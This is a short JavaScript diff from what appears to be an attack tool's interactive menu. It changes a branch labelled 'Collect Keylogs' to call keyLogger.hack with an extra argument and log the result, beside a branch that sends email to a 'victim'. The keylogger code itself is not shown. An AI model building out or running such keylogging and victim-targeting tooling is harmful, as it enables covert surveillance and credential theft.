@@ -36,7 +36,7 @@ const main = () => {
           });
         });
       } else if (answers.action === "Collect Keylogs") {
-        keyLogger.hack(exec);
+        keyLogger.hack(exec, Q).then(res => console.log(res));
       } else if (answers.action == "Send Email to victim") {
         emailService.sendEmail();
       }
